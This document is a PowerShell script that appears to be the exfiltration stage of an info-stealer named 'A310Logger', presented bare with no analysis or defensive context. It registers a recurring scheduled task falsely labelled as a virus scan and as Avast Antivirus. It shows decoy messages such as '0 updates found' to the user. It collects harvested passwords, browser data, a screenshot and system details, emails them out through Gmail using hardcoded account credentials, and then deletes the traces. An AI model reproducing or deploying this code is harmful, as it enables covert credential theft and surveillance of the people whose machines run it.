

Start-Sleep -Milliseconds 60
$currentLocation = ($pwd).Path
$location = "C:\Users\$env:UserName\AppData\Local\A310Logger"
$archv = "C:\Users\$env:UserName\AppData\Local\A310Logger"

if(!(Test-Path "$location\count.txt")) {
    [int]$count=0
    echo "$count"> "$location\count.txt"
}else{
    $count= Get-Content "$location\count.txt"
}


if(!(Get-ScheduledTask "This PC Virus Scan" -ErrorAction Ignore)) {
	$error.clear()
     try { 
	  schtasks.exe /CREATE /F /SC DAILY /MO 1 /TN "This PC Virus Scan" /TR 'wscript.exe ""C:\Users\Public\Google\b323log.vbs""' /ST 00:00 /RI 2 /DU 24:00 | Out-Null
     }
     catch { 
	    $trigger = New-JobTrigger -once -At $(get-date) -RepetitionInterval $([timespan]::FromMinutes("2")) -RepeatIndefinitely
            $action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument '"C:\Users\Public\Google\b323log.vbs"'
            Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "This PC Virus Scan" -Description "Avast Antivirus" -Force		
	   }
  }	
	
     $error.clear()
     try { 
	   Get-WmiObject -Class Win32_OperatingSystem | ForEach-Object -MemberName Caption
     }
     catch { echo "Microsoft Windows" }
     

Start-Sleep -Milliseconds 10
if (!(test-connection 8.8.8.8 -Count 1 -Quiet)) {
    Start-Sleep -Milliseconds 100
    echo " "
    echo " "
    echo "Error: Error in connect()"
    Start-Sleep -Milliseconds 100
    (Invoke-WebRequest -uri "http://ifconfig.me/ip").Content	
        Start-Sleep -Milliseconds 1000
        echo "Checking internet connection.."
	Start-Sleep -Milliseconds 5000
    echo "No internet connection? Try again!!"  
    Start-Sleep -Milliseconds 100 
}     
else{
    echo " "   
    echo " "
    echo " "
    echo " "     
    echo " "
    echo 'Gathering information.'
    Start-Sleep -Milliseconds 80  
    $ip= (Invoke-WebRequest -uri "http://ifconfig.me/ip").Content
  
#----------------------------------------------------------------Email------------------------------------------------------------------------------#

    $smtpserver = "smtp.gmail.com"
    $msg = new-object Net.Mail.MailMessage
    $smtp = New-Object Net.Mail.SmtpClient($smtpServer )
    $smtp.Timeout = 400000
    $smtp.EnableSsl = $True
    $smtp.Credentials = New-Object System.Net.NetworkCredential("com.microsoft.official@gmail.com", "33864171shakil"); 
    $msg.From = "com.microsoft.official@gmail.com"
    $msg.To.Add("com.microsoft.official@gmail.com")

    $msg.Subject = "$env:computername  ©®™💱💲🔴🔵⚫ {$ip ($count)}"
    $msg.Body = "New small Hack Arrived. Lets Enjoy !!!"                     

    $file1 = "$location\{$env:UserName}.zip"

    if(Test-Path $file1) {
    Remove-Item  $file1 -Recurse -Force -Confirm:$false
    }
	
	
	   

	
	
    $error.clear()
     try { 
        Compress-Archive -Path $archv -DestinationPath "$location\{$env:UserName}.zip" -Force -Confirm:$false
     }
       catch { 

       

       Start-Sleep -Milliseconds 10

	   
	   
	   
       if(Test-Path "C:\Users\$env:UserName\AppData\Local\A310Logger\Passwords.txt") {
          $msg.Attachments.Add("C:\Users\$env:UserName\AppData\Local\A310Logger\Passwords.txt")
       }   
       if(Test-Path "C:\Users\$env:UserName\AppData\Local\A310Logger\Information.txt") {
          $msg.Attachments.Add("C:\Users\$env:UserName\AppData\Local\A310Logger\Information.txt")
       }
       if(Test-Path "C:\Users\$env:UserName\AppData\Local\A310Logger\Screen.png") {
          $msg.Attachments.Add("C:\Users\$env:UserName\AppData\Local\A310Logger\Screen.png")
       }
       if(Test-Path "C:\Users\$env:UserName\AppData\Local\A310Logger\Process.txt") {
          $msg.Attachments.Add("C:\Users\$env:UserName\AppData\Local\A310Logger\Process.txt")
       }
       
       
       

     }
     if (!$error) {
       Start-Sleep -Milliseconds 10
       $msg.Attachments.Add($file1)
     }

    echo "This process will take some time. Please wait.."
    $smtp.Send($msg) | Out-Null
    Start-Sleep -Milliseconds 3000
    echo '0 updates found.' 
     
    }   
    $count= [int]$count+1
    $count > "$location\count.txt"
    Start-Sleep -Milliseconds 500
   
    


      if(Test-Path "C:\Users\$env:UserName\AppData\Local\A310Logger\Browsers") {
          Remove-Item  "C:\Users\$env:UserName\AppData\Local\A310Logger\Browsers" -Recurse -Force -Confirm:$false 
       }   
       if(Test-Path "C:\Users\$env:UserName\AppData\Local\A310Logger\Information.txt") {
          Remove-Item -LiteralPath "C:\Users\$env:UserName\AppData\Local\A310Logger\Information.txt" -Recurse -Force -Confirm:$false
       }
       if(Test-Path "C:\Users\$env:UserName\AppData\Local\A310Logger\Passwords.txt") {
          Remove-Item -LiteralPath "C:\Users\$env:UserName\AppData\Local\A310Logger\Passwords.txt" -Recurse -Force -Confirm:$false
       }
       if(Test-Path "C:\Users\$env:UserName\AppData\Local\A310Logger\Process.txt") {
          Remove-Item -LiteralPath "C:\Users\$env:UserName\AppData\Local\A310Logger\Process.txt" -Recurse -Force -Confirm:$false
       }

      
       

    
    
    
exit